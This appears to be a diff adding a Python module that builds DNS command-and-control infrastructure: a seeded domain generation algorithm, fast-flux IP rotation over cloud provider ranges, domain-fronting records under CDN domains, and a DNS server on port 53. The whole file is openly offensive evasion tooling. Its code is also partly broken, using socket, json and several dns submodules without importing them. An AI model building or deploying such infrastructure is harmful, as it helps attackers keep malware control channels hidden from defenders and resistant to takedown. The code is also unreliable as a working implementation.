@@ -1,0 +1,440 @@
+# dns_infrastructure.py
+"""
+DNS infrastructure for C2 with domain fronting and fast-flux
+"""
+
+import dns.resolver
+import dns.zone
+import dns.query
+import dns.update
+from dns import rdatatype
+import logging
+import time
+import random
+import threading
+from datetime import datetime, timedelta
+from typing import Dict, List, Optional, Tuple
+import ipaddress
+import hashlib
+import asyncio
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+class C2DNSInfrastructure:
+    """DNS infrastructure manager for C2 operations"""
+    
+    def __init__(self, config: Dict):
+        self.config = config
+        self.dns_records = {}
+        self.fast_flux_pool = set()
+        self.domain_fronting_domains = []
+        self.dga = DGA(config.get('dga_seed', 'c2-infra-2024'))
+        
+        # DNS servers
+        self.primary_dns = config.get('primary_dns', '10.0.1.10')
+        self.secondary_dns = config.get('secondary_dns', '10.0.1.11')
+        
+        # Initialize
+        self._init_fast_flux_pool()
+        self._init_domain_fronting()
+        self._generate_initial_records()
+        
+        # Start background tasks
+        self.running = True
+        self._start_background_tasks()
+    
+    def _init_fast_flux_pool(self):
+        """Initialize fast-flux IP pool"""
+        # Add cloud provider IP ranges
+        cloud_ranges = [
+            # AWS ranges (example)
+            "54.32.0.0/16",
+            "52.64.0.0/16",
+            # Azure ranges
+            "13.64.0.0/16",
+            "40.74.0.0/16",
+            # Google Cloud
+            "34.64.0.0/16",
+            "35.186.0.0/16"
+        ]
+        
+        for cidr in cloud_ranges:
+            network = ipaddress.ip_network(cidr)
+            # Sample some IPs from each range
+            for _ in range(10):
+                ip = str(network[random.randint(0, network.num_addresses - 1)])
+                self.fast_flux_pool.add(ip)
+        
+        logger.info(f"Initialized fast-flux pool with {len(self.fast_flux_pool)} IPs")
+    
+    def _init_domain_fronting(self):
+        """Initialize domain fronting domains"""
+        # Legitimate CDN domains for fronting
+        cdn_domains = [
+            "cloudfront.net",
+            "azureedge.net",
+            "googleusercontent.com",
+            "akamaiedge.net",
+            "fastly.net"
+        ]
+        
+        # Generate subdomains for fronting
+        for cdn in cdn_domains:
+            subdomain = f"{random.choice(['static', 'assets', 'cdn', 'media'])}-{random.randint(1000, 9999)}"
+            domain = f"{subdomain}.{cdn}"
+            self.domain_fronting_domains.append(domain)
+        
+        logger.info(f"Initialized {len(self.domain_fronting_domains)} domain fronting domains")
+    
+    def _generate_initial_records(self):
+        """Generate initial DNS records"""
+        # Generate DGA domains for next week
+        domains = self.dga.generate_domains(days=7)
+        
+        for domain in domains:
+            # Assign random TTL
+            ttl = random.choice([60, 120, 300, 600])
+            
+            # Add A records with fast-flux IPs
+            ips = random.sample(list(self.fast_flux_pool), min(3, len(self.fast_flux_pool)))
+            
+            self.dns_records[domain] = {
+                'type': 'A',
+                'ttl': ttl,
+                'values': ips,
+                'created': datetime.now(),
+                'last_updated': datetime.now(),
+                'fronting_domain': random.choice(self.domain_fronting_domains) if random.random() > 0.5 else None
+            }
+        
+        # Add CNAME records for domain fronting
+        for fronting_domain in self.domain_fronting_domains:
+            target = random.choice(list(self.dns_records.keys()))
+            self.dns_records[f"c2-{random.randint(100,999)}.{fronting_domain}"] = {
+                'type': 'CNAME',
+                'ttl': 300,
+                'values': [target],
+                'created': datetime.now(),
+                'last_updated': datetime.now()
+            }
+        
+        logger.info(f"Generated {len(self.dns_records)} DNS records")
+    
+    def rotate_fast_flux(self):
+        """Rotate fast-flux IP addresses"""
+        logger.info("Rotating fast-flux IPs...")
+        
+        for domain, record in self.dns_records.items():
+            if record['type'] == 'A':
+                # Replace some IPs
+                if len(record['values']) > 0 and random.random() < 0.3:
+                    # Remove some old IPs
+                    if len(record['values']) > 1:
+                        record['values'].pop(random.randint(0, len(record['values']) - 1))
+                    
+                    # Add new IP
+                    new_ip = random.choice(list(self.fast_flux_pool))
+                    record['values'].append(new_ip)
+                    record['last_updated'] = datetime.now()
+                    
+                    logger.debug(f"Updated {domain}: {record['values']}")
+    
+    def get_domain_ip(self, domain: str) -> Optional[str]:
+        """Get current IP for domain (with load balancing)"""
+        if domain not in self.dns_records:
+            return None
+        
+        record = self.dns_records[domain]
+        
+        if record['type'] == 'A' and record['values']:
+            # Simple round-robin load balancing
+            ip = record['values'][0]
+            # Rotate to next IP for next query
+            record['values'] = record['values'][1:] + [record['values'][0]]
+            return ip
+        
+        elif record['type'] == 'CNAME':
+            # Follow CNAME chain
+            target = record['values'][0]
+            return self.get_domain_ip(target)
+        
+        return None
+    
+    def handle_dns_query(self, query_name: str, query_type: str = 'A') -> Dict:
+        """Handle DNS query"""
+        response = {
+            'query': query_name,
+            'type': query_type,
+            'answers': [],
+            'authority': [],
+            'additional': [],
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        # Check if we have a record
+        if query_name in self.dns_records:
+            record = self.dns_records[query_name]
+            
+            if query_type == 'A' and record['type'] == 'A':
+                for ip in record['values']:
+                    response['answers'].append({
+                        'name': query_name,
+                        'type': 'A',
+                        'data': ip,
+                        'ttl': record['ttl']
+                    })
+            
+            elif query_type == 'CNAME' and record['type'] == 'CNAME':
+                for target in record['values']:
+                    response['answers'].append({
+                        'name': query_name,
+                        'type': 'CNAME',
+                        'data': target,
+                        'ttl': record['ttl']
+                    })
+        
+        # If no record found, try domain fronting
+        if not response['answers']:
+            # Check if this looks like a fronted domain
+            for fronting_domain in self.domain_fronting_domains:
+                if query_name.endswith(fronting_domain):
+                    # Return IP of legitimate CDN
+                    cdn_ip = self._get_cdn_ip(fronting_domain)
+                    if cdn_ip:
+                        response['answers'].append({
+                            'name': query_name,
+                            'type': 'A',
+                            'data': cdn_ip,
+                            'ttl': 60
+                        })
+                    break
+        
+        return response
+    
+    def _get_cdn_ip(self, domain: str) -> Optional[str]:
+        """Get actual CDN IP for domain fronting"""
+        # In real implementation, this would query actual DNS
+        # For demo, return a fake CDN IP
+        cdn_ips = {
+            'cloudfront.net': '13.32.0.0',
+            'azureedge.net': '13.107.0.0',
+            'googleusercontent.com': '172.217.0.0',
+            'akamaiedge.net': '23.0.0.0',
+            'fastly.net': '151.101.0.0'
+        }
+        
+        for cdn_domain, ip_prefix in cdn_ips.items():
+            if domain.endswith(cdn_domain):
+                return f"{ip_prefix[:-1]}{random.randint(1, 254)}"
+        
+        return None
+    
+    def _start_background_tasks(self):
+        """Start background maintenance tasks"""
+        
+        def fast_flux_rotation():
+            while self.running:
+                time.sleep(300)  # Every 5 minutes
+                self.rotate_fast_flux()
+        
+        def dga_regeneration():
+            while self.running:
+                time.sleep(3600)  # Every hour
+                self._update_dga_domains()
+        
+        self.rotation_thread = threading.Thread(target=fast_flux_rotation)
+        self.rotation_thread.daemon = True
+        self.rotation_thread.start()
+        
+        self.dga_thread = threading.Thread(target=dga_regeneration)
+        self.dga_thread.daemon = True
+        self.dga_thread.start()
+        
+        logger.info("Started background DNS maintenance tasks")
+    
+    def _update_dga_domains(self):
+        """Update DGA domains"""
+        # Remove expired domains
+        expired = []
+        for domain, record in self.dns_records.items():
+            if datetime.now() - record['created'] > timedelta(days=2):
+                expired.append(domain)
+        
+        for domain in expired:
+            del self.dns_records[domain]
+        
+        # Generate new domains
+        new_domains = self.dga.generate_domains(days=2)
+        for domain in new_domains:
+            if domain not in self.dns_records:
+                ips = random.sample(list(self.fast_flux_pool), min(3, len(self.fast_flux_pool)))
+                self.dns_records[domain] = {
+                    'type': 'A',
+                    'ttl': random.choice([60, 120, 300]),
+                    'values': ips,
+                    'created': datetime.now(),
+                    'last_updated': datetime.now()
+                }
+        
+        logger.info(f"Updated DGA domains: removed {len(expired)}, added {len(new_domains)}")
+    
+    def get_statistics(self) -> Dict:
+        """Get DNS infrastructure statistics"""
+        a_records = sum(1 for r in self.dns_records.values() if r['type'] == 'A')
+        cname_records = sum(1 for r in self.dns_records.values() if r['type'] == 'CNAME')
+        
+        return {
+            'total_records': len(self.dns_records),
+            'a_records': a_records,
+            'cname_records': cname_records,
+            'fast_flux_ips': len(self.fast_flux_pool),
+            'fronting_domains': len(self.domain_fronting_domains),
+            'last_rotation': datetime.now().isoformat()
+        }
+
+class DGA:
+    """Domain Generation Algorithm"""
+    
+    def __init__(self, seed: str):
+        self.seed = seed
+    
+    def generate_domains(self, days: int = 1) -> List[str]:
+        """Generate domains for specified number of days"""
+        domains = []
+        base_date = datetime.now()
+        
+        for day_offset in range(days):
+            date = base_date + timedelta(days=day_offset)
+            date_str = date.strftime("%Y%m%d")
+            
+            # Combine seed and date
+            combined = f"{self.seed}{date_str}"
+            
+            # Generate multiple domains per day
+            for i in range(3):
+                variation = f"{combined}{i}"
+                hash_obj = hashlib.md5(variation.encode())
+                hash_hex = hash_obj.hexdigest()
+                
+                # Create domain name
+                domain_name = hash_hex[:12]
+                
+                # Choose TLD
+                tlds = ['.com', '.net', '.org', '.info', '.biz']
+                tld_index = int(hash_hex[12:14], 16) % len(tlds)
+                
+                domain = f"{domain_name}{tlds[tld_index]}"
+                domains.append(domain)
+        
+        return domains
+
+# DNS Server Implementation
+class C2DNSServer:
+    """Simple DNS server for C2 infrastructure"""
+    
+    def __init__(self, dns_infra: C2DNSInfrastructure):
+        self.dns_infra = dns_infra
+        self.request_count = 0
+    
+    async def handle_dns_request(self, data: bytes, addr: tuple) -> bytes:
+        """Handle DNS request"""
+        self.request_count += 1
+        
+        try:
+            # Parse DNS query
+            request = dns.message.from_wire(data)
+            query = request.question[0]
+            
+            # Get response from infrastructure
+            response_data = self.dns_infra.handle_dns_query(
+                query.name.to_text(),
+                dns.rdatatype.to_text(query.rdtype)
+            )
+            
+            # Build DNS response
+            response = dns.message.make_response(request)
+            
+            # Add answers if available
+            if response_data['answers']:
+                for answer in response_data['answers']:
+                    rrset = dns.rrset.from_text(
+                        answer['name'],
+                        answer['ttl'],
+                        'IN',
+                        answer['type'],
+                        answer['data']
+                    )
+                    response.answer.append(rrset)
+            
+            # Add authority section
+            ns_rrset = dns.rrset.from_text(
+                '.',
+                3600,
+                'IN',
+                'NS',
+                'ns1.c2-infra.local.'
+            )
+            response.authority.append(ns_rrset)
+            
+            logger.debug(f"DNS Query from {addr[0]}: {query.name} -> {response_data}")
+            
+            return response.to_wire()
+            
+        except Exception as e:
+            logger.error(f"DNS handling error: {e}")
+            # Return SERVFAIL
+            response = dns.message.make_response(request)
+            response.set_rcode(dns.rcode.SERVFAIL)
+            return response.to_wire()
+    
+    async def start_server(self, host: str = "0.0.0.0", port: int = 53):
+        """Start DNS server"""
+        loop = asyncio.get_event_loop()
+        
+        # Create UDP socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((host, port))
+        
+        logger.info(f"DNS Server started on {host}:{port}")
+        
+        try:
+            while True:
+                data, addr = await loop.sock_recvfrom(sock, 512)
+                response = await self.handle_dns_request(data, addr)
+                await loop.sock_sendto(sock, response, addr)
+        except KeyboardInterrupt:
+            logger.info("DNS Server stopping...")
+        finally:
+            sock.close()
+
+# Example usage
+if __name__ == "__main__":
+    import asyncio
+    
+    # Create DNS infrastructure
+    config = {
+        'primary_dns': '10.0.1.10',
+        'secondary_dns': '10.0.1.11',
+        'dga_seed': 'corporate-c2-2024'
+    }
+    
+    dns_infra = C2DNSInfrastructure(config)
+    
+    # Create and start DNS server
+    dns_server = C2DNSServer(dns_infra)
+    
+    # Print statistics
+    print("DNS Infrastructure Status:")
+    print(json.dumps(dns_infra.get_statistics(), indent=2))
+    
+    # Example queries
+    test_domains = list(dns_infra.dns_records.keys())[:3]
+    for domain in test_domains:
+        response = dns_infra.handle_dns_query(domain)
+        print(f"\nQuery: {domain}")
+        print(f"Response: {response}")
+    
+    # Start server (uncomment to run)
+    # asyncio.run(dns_server.start_server())
